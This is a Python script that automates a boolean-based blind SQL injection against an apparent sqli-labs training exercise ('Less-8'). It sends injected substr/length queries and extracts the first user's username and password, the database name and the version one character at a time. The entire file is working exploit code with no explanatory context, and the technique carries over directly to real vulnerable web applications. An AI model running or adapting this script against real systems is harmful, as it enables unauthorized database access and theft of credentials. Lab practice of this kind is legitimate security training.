import requests
import sys
import string
from bs4 import BeautifulSoup

chars = string.printable[0:-6]

def main():

    #username
    usernameURL1 ="http://lab.awh.exdemy.com/chapter1/sqli_lab/Less-8/?id=1'+and+substr((select+length(username)+from+users+limit+0,1),1,1)="
    usernameURL2="http://lab.awh.exdemy.com/chapter1/sqli_lab/Less-8/?id=1'+and+substr((select+username+from+users+limit+0,1)"
    username=getData(usernameURL1, usernameURL2)
    #password
    passwordURL1 ="http://lab.awh.exdemy.com/chapter1/sqli_lab/Less-8/?id=1'+and+substr((select+length(password)+from+users+limit+0,1),1,1)="
    passwordURL2="http://lab.awh.exdemy.com/chapter1/sqli_lab/Less-8/?id=1'+and+substr((select+password+from+users+limit+0,1)"
    password =getData(passwordURL1, passwordURL2)
    #DataBase 
    #Name
    DBNURL1 ="http://lab.awh.exdemy.com/chapter1/sqli_lab/Less-8/?id=1'+and+substr((select+length(database())),1,1)="
    DBNURL2="http://lab.awh.exdemy.com/chapter1/sqli_lab/Less-8/?id=1'+and+substr((select+database())"
    DBN =getData(DBNURL1, DBNURL2)
    #version
    DBVURL1 ="http://lab.awh.exdemy.com/chapter1/sqli_lab/Less-8/?id=1'+and+substr((select+length(version())),1,1)="
    DBVURL2="http://lab.awh.exdemy.com/chapter1/sqli_lab/Less-8/?id=1'+and+substr((select+version())"
    DBV =getData(DBVURL1, DBVURL2)
    print(f"################\n#extracted data#\n################\n\nusername:{username}  password:{password}\nDB-Name:{DBN}\nDB-Version:{DBV}")




def CheckURL(url):
    try:
        response = requests.get(url)
        content = response.content
        soup = BeautifulSoup(content, 'html.parser')
        checking = str(soup.find('div').get_text())[21:-13]
        return checking
    except:
        print("problem in url")
        sys.exit()

def getData(url1, url2):

    def cheakLength(iurl):
        i =1
        while True:
            url =f"{iurl}{i}--+"
            checking = CheckURL(url)
            if checking =="You are in":
                break
            i=i+1
        return i
    def getOutput(length, url):
        output=""
        for i in range(1,length+1):
            for c in chars:
                url1 = f"{url},{i},1)='{c}'--+"
                checking = CheckURL(url1)
                if checking =="You are in":
                    break
            output=output+c
        return output
    length = cheakLength(url1)
    data = getOutput(length, url2)
    return data
    


if __name__ == '__main__':
    main()